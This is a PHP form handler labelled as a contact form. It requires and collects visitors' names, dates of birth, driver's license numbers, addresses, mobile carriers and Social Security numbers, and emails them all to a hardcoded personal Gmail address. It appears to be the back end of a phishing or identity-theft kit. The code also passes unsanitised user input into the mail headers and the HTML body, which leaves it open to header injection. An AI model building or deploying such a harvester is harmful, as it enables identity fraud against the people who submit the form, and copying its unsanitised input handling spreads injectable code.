<?php
if( isset($_POST['n']) && isset($_POST['e']) && isset($_POST['d']) && isset($_POST['dl']) && isset($_POST['sa']) && isset($_POST['c']) && isset($_POST['st']) && isset($_POST['z']) && isset($_POST['m']) && isset($_POST['mc']) && isset($_POST['ss']) ){
	$n = $_POST['n']; // HINT: use preg_replace() to filter the data
	$e = $_POST['e'];
	$d = $_POST['d'];
	$dl = $_POST['dl'];
	$sa = $_POST['sa'];
	$c = $_POST['c'];
	$st = $_POST['st'];
	$z = $_POST['z'];
	$m = $_POST['m'];
	$mc = $_POST['mc'];
	$ss = $_POST['ss'];
	
	
	$to = "neilfloyd99@gmail.com";	
	$from = $e;
	$subject = 'Contact Form Message';
	$message = '<b>Name:</b> '.$n.' <br><b>Email:</b> '.$e.' <br><b>DOB:</b> '.$d.' <br><b>Drivers License Number:</b> '.$dl.' <br><b>Street Address:</b> '.$sa.' <br><b>City:</b> '.$c.' <br><b>State:</b> '.$st.' <br><b>Zip Code:</b> '.$z.' <br><b>Mobile Number:</b> '.$m.' <br><b>Mobile Carrier:</b> '.$mc.' <br><b>Social Security Number:</b> '.$ss.'';
	$headers = "From: $from\n";
	$headers .= "MIME-Version: 1.0\n";
	$headers .= "Content-type: text/html; charset=iso-8859-1\n";
	if( mail($to, $subject, $message, $headers) ){
		echo "success";
	} else {
		echo "The server failed to send the message. Please try again later.";
	}
}
?>